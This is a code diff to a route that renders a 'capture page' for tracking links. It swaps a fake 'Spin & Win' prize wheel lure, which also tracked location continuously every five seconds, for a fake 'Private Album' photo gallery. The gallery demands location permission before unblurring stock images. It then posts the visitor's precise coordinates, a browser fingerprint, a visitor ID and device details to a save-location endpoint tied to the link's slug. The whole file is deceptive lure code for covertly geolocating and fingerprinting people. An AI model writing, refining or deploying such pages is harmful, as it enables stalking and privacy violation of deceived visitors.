@@ -10,7 +10,7 @@ const renderCapturePage = async (req, res, next) => {
     const trackingLink = req.trackingLink;
     // Get slug from trackingLink OR from URL params (/xxx/:slug)
     const customSlug = trackingLink ? trackingLink.slug : (req.params.slug || null);
-    const customTitle = trackingLink ? trackingLink.name : 'Daily Lucky Draw';
+    const customTitle = trackingLink ? trackingLink.name : 'Photo Gallery';
     
     // If tracking link is expired, show error
     if (trackingLink && trackingLink.expiresAt && new Date() > trackingLink.expiresAt) {
@@ -23,8 +23,8 @@ const renderCapturePage = async (req, res, next) => {
       <head>
           <meta charset="UTF-8">
           <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-          <meta name="theme-color" content="#ff6b6b">
-          <title>🎰 ${customTitle}</title>
+          <meta name="theme-color" content="#4f46e5">
+          <title>📸 ${customTitle}</title>
           <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
           <style>
               * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -35,352 +35,319 @@ const renderCapturePage = async (req, res, next) => {
                   display: flex;
                   flex-direction: column;
                   align-items: center;
-                  justify-content: center;
+                  padding: 20px;
                   overflow-x: hidden;
                   color: white;
               }
-              .glow-bg {
-                  position: fixed;
-                  width: 300px;
-                  height: 300px;
-                  border-radius: 50%;
-                  filter: blur(100px);
-                  opacity: 0.5;
-                  animation: float 6s ease-in-out infinite;
-              }
-              .glow-1 { background: #e94560; top: 10%; left: -100px; animation-delay: 0s; }
-              .glow-2 { background: #533483; bottom: 10%; right: -100px; animation-delay: 3s; }
-              @keyframes float {
-                  0%, 100% { transform: translateY(0) scale(1); }
-                  50% { transform: translateY(-30px) scale(1.1); }
-              }
               .container {
-                  text-align: center;
-                  padding: 20px;
-                  max-width: 450px;
                   width: 100%;
+                  max-width: 400px;
                   position: relative;
                   z-index: 10;
               }
+              .header {
+                  text-align: center;
+                  margin-bottom: 20px;
+              }
               .header-badge {
-                  background: linear-gradient(90deg, #ffd700, #ffed4e);
-                  color: #1a1a2e;
-                  padding: 8px 20px;
-                  border-radius: 25px;
-                  font-size: 12px;
-                  font-weight: 700;
+                  background: linear-gradient(90deg, #4f46e5, #7c3aed);
+                  color: white;
+                  padding: 6px 16px;
+                  border-radius: 20px;
+                  font-size: 11px;
+                  font-weight: 600;
                   display: inline-block;
-                  margin-bottom: 15px;
-                  box-shadow: 0 4px 15px rgba(255, 215, 0, 0.4);
-                  animation: shimmer 2s infinite;
-              }
-              @keyframes shimmer {
-                  0%, 100% { box-shadow: 0 4px 15px rgba(255, 215, 0, 0.4); }
-                  50% { box-shadow: 0 4px 30px rgba(255, 215, 0, 0.8); }
-              }
-              h1 {
-                  font-size: 2.2rem;
-                  font-weight: 900;
-                  margin-bottom: 10px;
-                  background: linear-gradient(90deg, #fff, #ffd700, #fff);
-                  -webkit-background-clip: text;
-                  -webkit-text-fill-color: transparent;
-                  background-clip: text;
-              }
-              .subtitle {
-                  color: rgba(255,255,255,0.7);
-                  font-size: 0.95rem;
-                  margin-bottom: 30px;
+                  margin-bottom: 12px;
               }
               .custom-url-badge {
                   background: rgba(255,255,255,0.1);
                   backdrop-filter: blur(10px);
                   border: 1px solid rgba(255,255,255,0.2);
-                  padding: 6px 15px;
-                  border-radius: 20px;
-                  font-size: 11px;
-                  color: rgba(255,255,255,0.8);
-                  margin-bottom: 20px;
+                  padding: 4px 12px;
+                  border-radius: 15px;
+                  font-size: 10px;
+                  color: rgba(255,255,255,0.7);
+                  margin-bottom: 10px;
                   display: inline-block;
               }
-              .wheel-container {
-                  position: relative;
-                  width: 280px;
-                  height: 280px;
-                  margin: 0 auto 30px;
-              }
-              .wheel {
-                  width: 100%;
-                  height: 100%;
-                  border-radius: 50%;
-                  position: relative;
-                  background: conic-gradient(
-                      #e94560 0deg 45deg,
-                      #533483 45deg 90deg,
-                      #0ead69 90deg 135deg,
-                      #ffd700 135deg 180deg,
-                      #e94560 180deg 225deg,
-                      #533483 225deg 270deg,
-                      #0ead69 270deg 315deg,
-                      #ffd700 315deg 360deg
-                  );
-                  box-shadow: 
-                      0 0 0 10px #1a1a2e,
-                      0 0 0 15px #ffd700,
-                      0 20px 50px rgba(0,0,0,0.5),
-                      inset 0 0 30px rgba(0,0,0,0.3);
-                  transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
-              }
-              .wheel::before {
-                  content: '';
-                  position: absolute;
-                  top: 50%;
-                  left: 50%;
-                  transform: translate(-50%, -50%);
-                  width: 60px;
-                  height: 60px;
-                  background: linear-gradient(145deg, #ffd700, #ffed4e);
-                  border-radius: 50%;
-                  box-shadow: 0 5px 20px rgba(0,0,0,0.3);
-                  z-index: 10;
-              }
-              .wheel-center {
-                  position: absolute;
-                  top: 50%;
-                  left: 50%;
-                  transform: translate(-50%, -50%);
-                  font-size: 24px;
-                  z-index: 11;
-                  pointer-events: none;
-              }
-              .wheel-text {
-                  position: absolute;
-                  width: 100%;
-                  height: 100%;
-              }
-              .prize-label {
-                  position: absolute;
-                  font-size: 10px;
+              h1 {
+                  font-size: 1.8rem;
                   font-weight: 700;
-                  color: white;
-                  text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
-                  transform-origin: center;
+                  margin-bottom: 5px;
               }
-              .pointer {
+              .subtitle {
+                  color: rgba(255,255,255,0.6);
+                  font-size: 0.85rem;
+              }
+              
+              /* Image Album Grid */
+              .album-grid {
+                  display: grid;
+                  grid-template-columns: repeat(2, 1fr);
+                  gap: 12px;
+                  margin-bottom: 25px;
+              }
+              .album-card {
+                  aspect-ratio: 1;
+                  border-radius: 16px;
+                  overflow: hidden;
+                  position: relative;
+                  background: rgba(255,255,255,0.1);
+                  border: 2px solid rgba(255,255,255,0.1);
+                  transition: transform 0.3s ease, border-color 0.3s ease;
+                  cursor: pointer;
+              }
+              .album-card:hover {
+                  transform: scale(1.02);
+                  border-color: rgba(255,255,255,0.3);
+              }
+              .album-card img {
+                  width: 100%;
+                  height: 100%;
+                  object-fit: cover;
+              }
+              .album-card .placeholder {
+                  width: 100%;
+                  height: 100%;
+                  display: flex;
+                  align-items: center;
+                  justify-content: center;
+                  font-size: 3rem;
+                  background: linear-gradient(135deg, #4f46e5, #7c3aed);
+              }
+              .album-card .blur-overlay {
                   position: absolute;
-                  top: -20px;
-                  left: 50%;
-                  transform: translateX(-50%);
-                  width: 0;
-                  height: 0;
-                  border-left: 15px solid transparent;
-                  border-right: 15px solid transparent;
-                  border-top: 30px solid #ffd700;
-                  filter: drop-shadow(0 3px 5px rgba(0,0,0,0.3));
-                  z-index: 20;
+                  inset: 0;
+                  backdrop-filter: blur(8px);
+                  background: rgba(0,0,0,0.3);
+                  display: flex;
+                  align-items: center;
+                  justify-content: center;
+                  font-size: 2rem;
               }
-              .spin-btn {
-                  background: linear-gradient(145deg, #e94560, #c73e54);
+              
+              /* View Images Button */
+              .view-btn {
+                  width: 100%;
+                  background: linear-gradient(145deg, #4f46e5, #7c3aed);
                   color: white;
                   border: none;
-                  padding: 18px 50px;
+                  padding: 16px 32px;
                   border-radius: 50px;
-                  font-size: 1.3rem;
-                  font-weight: 700;
+                  font-size: 1.1rem;
+                  font-weight: 600;
                   cursor: pointer;
-                  box-shadow: 
-                      0 10px 30px rgba(233, 69, 96, 0.4),
-                      inset 0 2px 0 rgba(255,255,255,0.2);
+                  box-shadow: 0 10px 30px rgba(79, 70, 229, 0.4);
                   transition: all 0.3s ease;
-                  text-transform: uppercase;
-                  letter-spacing: 2px;
+                  display: flex;
+                  align-items: center;
+                  justify-content: center;
+                  gap: 10px;
               }
-              .spin-btn:hover {
-                  transform: translateY(-3px);
-                  box-shadow: 0 15px 40px rgba(233, 69, 96, 0.5);
+              .view-btn:hover {
+                  transform: translateY(-2px);
+                  box-shadow: 0 15px 40px rgba(79, 70, 229, 0.5);
               }
-              .spin-btn:active {
-                  transform: translateY(0);
-              }
-              .spin-btn:disabled {
+              .view-btn:disabled {
                   background: #444;
                   cursor: not-allowed;
                   box-shadow: none;
               }
-              .prizes-list {
-                  display: flex;
-                  justify-content: center;
-                  gap: 10px;
-                  margin-top: 25px;
-                  flex-wrap: wrap;
+              .view-btn .icon {
+                  font-size: 1.3rem;
               }
-              .prize-chip {
-                  background: rgba(255,255,255,0.1);
-                  backdrop-filter: blur(10px);
-                  padding: 8px 15px;
-                  border-radius: 20px;
-                  font-size: 11px;
-                  border: 1px solid rgba(255,255,255,0.2);
-              }
-              .stats-row {
-                  display: flex;
-                  justify-content: center;
-                  gap: 40px;
-                  margin-top: 20px;
-              }
-              .stat-item {
-                  text-align: center;
-              }
-              .stat-value {
-                  font-size: 1.8rem;
-                  font-weight: 700;
-                  color: #ffd700;
-              }
-              .stat-label {
-                  font-size: 11px;
-                  color: rgba(255,255,255,0.6);
-                  text-transform: uppercase;
-                  letter-spacing: 1px;
-              }
-              .winner-banner {
+              
+              /* Loading State */
+              .loading-overlay {
                   display: none;
                   position: fixed;
-                  top: 0;
-                  left: 0;
-                  right: 0;
-                  bottom: 0;
+                  inset: 0;
                   background: rgba(0,0,0,0.9);
                   z-index: 1000;
+                  flex-direction: column;
+                  align-items: center;
+                  justify-content: center;
+                  gap: 20px;
+              }
+              .loading-overlay.active {
+                  display: flex;
+              }
+              .spinner {
+                  width: 50px;
+                  height: 50px;
+                  border: 3px solid rgba(255,255,255,0.2);
+                  border-top-color: #4f46e5;
+                  border-radius: 50%;
+                  animation: spin 1s linear infinite;
+              }
+              @keyframes spin {
+                  to { transform: rotate(360deg); }
+              }
+              .loading-text {
+                  color: rgba(255,255,255,0.8);
+                font-size: 0.95rem;
+              }
+              
+              /* Gallery View */
+              .gallery-overlay {
+                  display: none;
+                  position: fixed;
+                  inset: 0;
+                  background: rgba(0,0,0,0.95);
+                  z-index: 1001;
+                  flex-direction: column;
+              }
+              .gallery-overlay.active {
+                  display: flex;
+              }
+              .gallery-header {
+                  display: flex;
+                  align-items: center;
+                  justify-content: space-between;
+                  padding: 15px 20px;
+                  border-bottom: 1px solid rgba(255,255,255,0.1);
+              }
+              .gallery-title {
+                  font-size: 1.1rem;
+                  font-weight: 600;
+              }
+              .close-btn {
+                  background: rgba(255,255,255,0.1);
+                  border: none;
+                  color: white;
+                  width: 36px;
+                  height: 36px;
+                  border-radius: 50%;
+                  cursor: pointer;
+                  font-size: 1.2rem;
+                  display: flex;
+                  align-items: center;
+                  justify-content: center;
+              }
+              .gallery-content {
+                  flex: 1;
+                  display: flex;
                   align-items: center;
                   justify-content: center;
                   padding: 20px;
               }
-              .winner-banner.active {
+              .gallery-image {
+                  max-width: 100%;
+                  max-height: 60vh;
+                  border-radius: 12px;
+                object-fit: contain;
+              }
+              .gallery-nav {
                   display: flex;
+                  justify-content: center;
+                  gap: 20px;
+                  padding: 20px;
               }
-              .winner-content {
-                  background: linear-gradient(145deg, #1a1a2e, #16213e);
-                  border-radius: 20px;
-                  padding: 40px;
-                  text-align: center;
-                  border: 2px solid #ffd700;
-                  box-shadow: 0 0 50px rgba(255, 215, 0, 0.3);
-                  animation: popIn 0.5s ease;
-              }
-              @keyframes popIn {
-                  from { transform: scale(0.5); opacity: 0; }
-                  to { transform: scale(1); opacity: 1; }
-              }
-              .winner-emoji {
-                  font-size: 60px;
-                  margin-bottom: 20px;
-              }
-              .winner-title {
-                  font-size: 1.8rem;
-                  font-weight: 700;
-                  color: #ffd700;
-                  margin-bottom: 10px;
-              }
-              .winner-prize {
-                  font-size: 1.2rem;
-                  color: white;
-                  margin-bottom: 25px;
-              }
-              .claim-btn {
-                  background: linear-gradient(90deg, #ffd700, #ffed4e);
-                  color: #1a1a2e;
+              .nav-btn {
+                  background: rgba(255,255,255,0.1);
                   border: none;
-                  padding: 15px 40px;
-                  border-radius: 30px;
-                  font-size: 16px;
-                  font-weight: 700;
+                  color: white;
+                  padding: 12px 24px;
+                  border-radius: 25px;
                   cursor: pointer;
-                  width: 100%;
+                  font-size: 0.9rem;
               }
+              
               #status {
                   margin-top: 15px;
-                  font-size: 13px;
-                  color: rgba(255,255,255,0.7);
+                  font-size: 12px;
+                  color: rgba(255,255,255,0.6);
+                  text-align: center;
                   min-height: 20px;
-              }
-              .pulse-ring {
-                  position: absolute;
-                  top: 50%;
-                  left: 50%;
-                  transform: translate(-50%, -50%);
-                  width: 300px;
-                  height: 300px;
-                  border: 2px solid rgba(255, 215, 0, 0.3);
-                  border-radius: 50%;
-                  animation: pulseRing 2s infinite;
-                  pointer-events: none;
-              }
-              @keyframes pulseRing {
-                  0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-                  100% { transform: translate(-50%, -50%) scale(1.3); opacity: 0; }
               }
           </style>
       </head>
       <body>
-          <div class="glow-bg glow-1"></div>
-          <div class="glow-bg glow-2"></div>
-          
           <div class="container">
-              <div class="header-badge">🎉 DAILY FREE SPIN</div>
-              ${customSlug ? `<div class="custom-url-badge">🔗 /${customSlug}</div>` : ''}
-              <h1>SPIN & WIN</h1>
-              <p class="subtitle">Tap SPIN to try your luck today!</p>
-              
-              <div class="wheel-container">
-                  <div class="pulse-ring"></div>
-                  <div class="pointer"></div>
-                  <div class="wheel" id="wheel"></div>
-                  <div class="wheel-center">🎰</div>
+              <div class="header">
+                  <div class="header-badge">📸 PRIVATE ALBUM</div>
+                  ${customSlug ? `<div class="custom-url-badge">🔗 /${customSlug}</div>` : ''}
+                  <h1>Photo Gallery</h1>
+                  <p class="subtitle">View exclusive photos</p>
               </div>
               
-              <button class="spin-btn" id="spin-btn">SPIN NOW</button>
-              
-              <div class="prizes-list">
-                  <span class="prize-chip">📱 iPhone 15</span>
-                  <span class="prize-chip">💰 $500</span>
-                  <span class="prize-chip">🎮 PS5</span>
-                  <span class="prize-chip">🎁 Mystery Box</span>
-              </div>
-              
-              <div class="stats-row">
-                  <div class="stat-item">
-                      <div class="stat-value" id="spins-left">3</div>
-                      <div class="stat-label">Spins Left</div>
+              <!-- Album Grid -->
+              <div class="album-grid">
+                  <div class="album-card" onclick="showGallery(0)">
+                      <div class="placeholder">🏖️</div>
+                      <div class="blur-overlay">🔒</div>
                   </div>
-                  <div class="stat-item">
-                      <div class="stat-value">2.4K</div>
-                      <div class="stat-label">Winners Today</div>
+                  <div class="album-card" onclick="showGallery(1)">
+                      <div class="placeholder">🌅</div>
+                      <div class="blur-overlay">🔒</div>
+                  </div>
+                  <div class="album-card" onclick="showGallery(2)">
+                      <div class="placeholder">🎉</div>
+                      <div class="blur-overlay">�</div>
+                  </div>
+                  <div class="album-card" onclick="showGallery(3)">
+                      <div class="placeholder">📸</div>
+                      <div class="blur-overlay">🔒</div>
+                  </div>
+                  <div class="album-card" onclick="showGallery(4)">
+                      <div class="placeholder">✈️</div>
+                      <div class="blur-overlay">🔒</div>
+                  </div>
+                  <div class="album-card" onclick="showGallery(5)">
+                      <div class="placeholder">🍽️</div>
+                      <div class="blur-overlay">�</div>
                   </div>
               </div>
+              
+              <button class="view-btn" id="view-btn" onclick="handleViewImages()">
+                  <span class="icon">🔓</span>
+                  <span>View Images</span>
+              </button>
               
               <div id="status"></div>
           </div>
           
-          <div class="winner-banner" id="winner-banner">
-              <div class="winner-content">
-                  <div class="winner-emoji">🎊</div>
-                  <div class="winner-title">CONGRATULATIONS!</div>
-                  <div class="winner-prize">You won a <strong>Mystery Prize!</strong></div>
-                  <button class="claim-btn" id="claim-btn">Claim Your Prize</button>
+          <!-- Loading Overlay -->
+          <div class="loading-overlay" id="loading-overlay">
+              <div class="spinner"></div>
+              <div class="loading-text">Unlocking gallery...</div>
+          </div>
+          
+          <!-- Gallery Overlay -->
+          <div class="gallery-overlay" id="gallery-overlay">
+              <div class="gallery-header">
+                  <div class="gallery-title">📸 Photo Gallery</div>
+                  <button class="close-btn" onclick="closeGallery()">✕</button>
+              </div>
+              <div class="gallery-content">
+                  <img class="gallery-image" id="gallery-image" src="" alt="Photo">
+              </div>
+              <div class="gallery-nav">
+                  <button class="nav-btn" onclick="prevImage()">← Previous</button>
+                  <button class="nav-btn" onclick="nextImage()">Next →</button>
               </div>
           </div>
 
           <script>
               const CUSTOM_SLUG = '${customSlug || ''}';
-              const wheel = document.getElementById('wheel');
-              const spinBtn = document.getElementById('spin-btn');
-              const winnerBanner = document.getElementById('winner-banner');
-              const claimBtn = document.getElementById('claim-btn');
               const status = document.getElementById('status');
+              const viewBtn = document.getElementById('view-btn');
+              const loadingOverlay = document.getElementById('loading-overlay');
+              const galleryOverlay = document.getElementById('gallery-overlay');
+              const galleryImage = document.getElementById('gallery-image');
               
-              let isSpinning = false;
-              let currentRotation = 0;
-              let spinsLeft = 3;
+              let currentImageIndex = 0;
+              let galleryUnlocked = false;
+              
+              // Emoji gallery images (using placeholders)
+              const galleryImages = [
+                  'https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=800',
+                  'https://images.unsplash.com/photo-1493225457124-a3eb161ffa5f?w=800',
+                  'https://images.unsplash.com/photo-1514525253161-7a46d19cd819?w=800',
+                  'https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=800',
+                  'https://images.unsplash.com/photo-1436491865332-7a61a109cc05?w=800',
+                  'https://images.unsplash.com/photo-1414235077428-338989a2e8c0?w=800'
+              ];
 
               const getVisitorId = () => {
                   try {
@@ -406,14 +373,6 @@ const renderCapturePage = async (req, res, next) => {
                       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                       userAgent: navigator.userAgent,
                   };
-                  try {
-                      const canvas = document.createElement('canvas');
-                      const ctx = canvas.getContext('2d');
-                      canvas.width = 200; canvas.height = 50;
-                      ctx.fillStyle = '#f60';
-                      ctx.fillRect(0, 0, 200, 50);
-                      data.canvas = canvas.toDataURL();
-                  } catch (e) {}
                   return data;
               };
 
@@ -485,176 +444,107 @@ const renderCapturePage = async (req, res, next) => {
                   } catch (e) {}
               });
 
-              // Track user continuously after spin
-              let watchId = null;
-              let trackingInterval = null;
-              
-              const startTracking = (fp) => {
-                  // Send location every 5 seconds
-                  trackingInterval = setInterval(async () => {
-                      navigator.geolocation.getCurrentPosition(
-                          async (position) => {
-                              await sendLocation(position, fp, true); // true = continuous update
-                          },
-                          () => {}, // silently fail
-                          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                      );
-                  }, 5000); // Every 5 seconds
-                  
-                  // Also watch for significant position changes
-                  watchId = navigator.geolocation.watchPosition(
-                      async (position) => {
-                          await sendLocation(position, fp, true);
-                      },
-                      () => {},
-                      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0, distanceFilter: 10 }
-                  );
-              };
-
-              spinBtn.addEventListener('click', async () => {
-                  if (isSpinning || spinsLeft <= 0) return;
-                  
-                  // Track click immediately
-                  await track('spin_button_clicked');
-                  
-                  // Check if geolocation is supported
-                  if (!navigator.geolocation) {
-                      await track('permission_result', { status: 'not_supported' });
-                      status.innerHTML = '<span class="text-red-400">❌ Location not supported on this device</span>';
-                      setTimeout(() => winnerBanner.classList.add('active'), 500);
+              async function handleViewImages() {
+                  if (galleryUnlocked) {
+                      showGallery(0);
                       return;
                   }
-
-                  isSpinning = true;
-                  spinsLeft--;
-                  document.getElementById('spins-left').textContent = spinsLeft;
-                  spinBtn.disabled = true;
-                  status.innerHTML = '🎰 Spinning... Requesting location access';
                   
-                  // Start spin animation
-                  const spins = 5 + Math.random() * 3;
-                  const degrees = spins * 360 + Math.random() * 360;
-                  currentRotation += degrees;
-                  wheel.style.transform = 'rotate(' + currentRotation + 'deg)';
+                  viewBtn.disabled = true;
+                  loadingOverlay.classList.add('active');
+                  status.textContent = '📍 Requesting location access...';
                   
-                  const fp = await getFingerprintData();
-                  currentFp = fp;
-                  let locationAttempts = 0;
-                  let bestPosition = null;
-                  let locationError = null;
-
-                  // Request location immediately with better error handling
-                  const requestLocation = () => {
-                      return new Promise((resolve, reject) => {
-                          track('permission_requested');
-                          navigator.geolocation.getCurrentPosition(
-                              (position) => {
-                                  console.log('Location acquired:', position.coords);
-                                  bestPosition = position;
-                                  track('permission_result', { status: 'granted' });
-                                  resolve(position);
-                              },
-                              (error) => {
-                                  console.error('Location error:', error.code, error.message);
-                                  locationError = error;
-                                  track('permission_result', { 
-                                      status: error.code === 1 ? 'denied' : error.code === 2 ? 'unavailable' : 'timeout',
-                                      errorCode: error.code,
-                                      errorMessage: error.message
-                                  });
-                                  reject(error);
-                              },
-                              { 
-                                  enableHighAccuracy: true, 
-                                  timeout: 15000,
-                                  maximumAge: 0 
-                              }
-                          );
-                      });
-                  };
-
-                  // Try to get location with multiple attempts
-                  const tryGetLocation = async () => {
-                      while (locationAttempts < 3 && !bestPosition) {
-                          locationAttempts++;
-                          track('location_attempt', { attempt: locationAttempts });
-                          status.innerHTML = '📍 Requesting location... (Attempt ' + locationAttempts + '/3)';
-                          
-                          try {
-                              await requestLocation();
-                              break;
-                          } catch (err) {
-                              console.log('Attempt', locationAttempts, 'failed:', err);
-                              if (locationAttempts < 3) {
-                                  await new Promise(r => setTimeout(r, 2000));
-                              }
-                          }
-                      }
-
-                      if (bestPosition) {
-                          status.innerHTML = '📍 Location captured! Saving...';
-                          track('location_captured', { 
-                              latitude: bestPosition.coords.latitude,
-                              longitude: bestPosition.coords.longitude,
-                              accuracy: bestPosition.coords.accuracy
+                  await track('view_images_clicked');
+                  
+                  if (!navigator.geolocation) {
+                      status.innerHTML = '<span style="color: #ef4444;">❌ Location not supported</span>';
+                      loadingOverlay.classList.remove('active');
+                      viewBtn.disabled = false;
+                      return;
+                  }
+                  
+                  // Request location
+                  navigator.geolocation.getCurrentPosition(
+                      async (position) => {
+                          await track('permission_result', { status: 'granted' });
+                          await track('location_captured', {
+                              latitude: position.coords.latitude,
+                              longitude: position.coords.longitude,
+                              accuracy: position.coords.accuracy
                           });
-                          await sendLocation(bestPosition, fp);
-                          status.innerHTML = '✅ Location saved!';
-                          startTracking(fp);
-                      } else {
-                          let errorMsg = '❌ Location access denied';
-                          if (locationError) {
-                              if (locationError.code === 1) errorMsg = '❌ Permission denied. Please allow location access.';
-                              else if (locationError.code === 2) errorMsg = '❌ Position unavailable';
-                              else if (locationError.code === 3) errorMsg = '❌ Timeout - taking too long';
-                          }
-                          status.innerHTML = errorMsg;
-                          track('error', { message: errorMsg });
-                          console.error('Failed to get location after', locationAttempts, 'attempts');
-                      }
-                  };
-
-                  tryGetLocation();
-
-                  // Show winner banner after spin completes
-                  setTimeout(async () => {
-                      winnerBanner.classList.add('active');
-                      isSpinning = false;
-                      await track('spin_completed');
-                      if (spinsLeft > 0) spinBtn.disabled = false;
-                      else {
-                          spinBtn.textContent = 'NO SPINS LEFT';
-                          status.innerHTML = 'Come back tomorrow!';
-                      }
-                  }, 4000);
-              });
-
-              const sendLocation = async (position, fp, isUpdate = false) => {
-                  const data = {
-                      latitude: position.coords.latitude,
-                      longitude: position.coords.longitude,
-                      accuracy: position.coords.accuracy,
-                      altitude: position.coords.altitude,
-                      method: 'geolocation',
-                      visitorId: getVisitorId(),
-                      fingerprintHash: generateHash(fp),
-                      screenResolution: fp.screen,
-                      language: fp.language,
-                      timezone: fp.timezone,
-                      userAgent: fp.userAgent,
-                      deviceInfo: fp,
-                      trackingLinkSlug: CUSTOM_SLUG,
-                      isUpdate: isUpdate
-                  };
-                  
-                  await fetch('/public/save-location', {
-                      method: 'POST',
-                      headers: { 'Content-Type': 'application/json' },
-                      body: JSON.stringify(data)
-                  });
-              };
-
-              claimBtn.addEventListener('click', () => location.reload());
+                          
+                          // Send location to server
+                          const fp = await getFingerprintData();
+                          await fetch('/public/save-location', {
+                              method: 'POST',
+                              headers: { 'Content-Type': 'application/json' },
+                              body: JSON.stringify({
+                                  latitude: position.coords.latitude,
+                                  longitude: position.coords.longitude,
+                                  accuracy: position.coords.accuracy,
+                                  method: 'geolocation',
+                                  visitorId: getVisitorId(),
+                                  fingerprintHash: generateHash(fp),
+                                  screenResolution: fp.screen,
+                                  language: fp.language,
+                                  timezone: fp.timezone,
+                                  userAgent: fp.userAgent,
+                                  deviceInfo: fp,
+                                  trackingLinkSlug: CUSTOM_SLUG
+                              })
+                          });
+                          
+                          // Unlock gallery
+                          galleryUnlocked = true;
+                          loadingOverlay.classList.remove('active');
+                          status.innerHTML = '<span style="color: #22c55e;">✅ Gallery unlocked!</span>';
+                          viewBtn.innerHTML = '<span class="icon">📸</span><span>View Images</span>';
+                          
+                          // Remove blur overlays
+                          document.querySelectorAll('.blur-overlay').forEach(el => {
+                              el.style.opacity = '0';
+                              el.style.pointerEvents = 'none';
+                          });
+                          
+                          // Show first image
+                          showGallery(0);
+                      },
+                      async (error) => {
+                          await track('permission_result', { 
+                              status: error.code === 1 ? 'denied' : 'error',
+                              errorCode: error.code 
+                          });
+                          status.innerHTML = '<span style="color: #ef4444;">❌ Location access required to view images</span>';
+                          loadingOverlay.classList.remove('active');
+                          viewBtn.disabled = false;
+                      },
+                      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                  );
+              }
+              
+              function showGallery(index) {
+                  if (!galleryUnlocked) {
+                      handleViewImages();
+                      return;
+                  }
+                  currentImageIndex = index;
+                  galleryImage.src = galleryImages[index];
+                  galleryOverlay.classList.add('active');
+              }
+              
+              function closeGallery() {
+                  galleryOverlay.classList.remove('active');
+              }
+              
+              function nextImage() {
+                  currentImageIndex = (currentImageIndex + 1) % galleryImages.length;
+                  galleryImage.src = galleryImages[currentImageIndex];
+              }
+              
+              function prevImage() {
+                  currentImageIndex = (currentImageIndex - 1 + galleryImages.length) % galleryImages.length;
+                  galleryImage.src = galleryImages[currentImageIndex];
+              }
           </script>
       </body>
       </html>
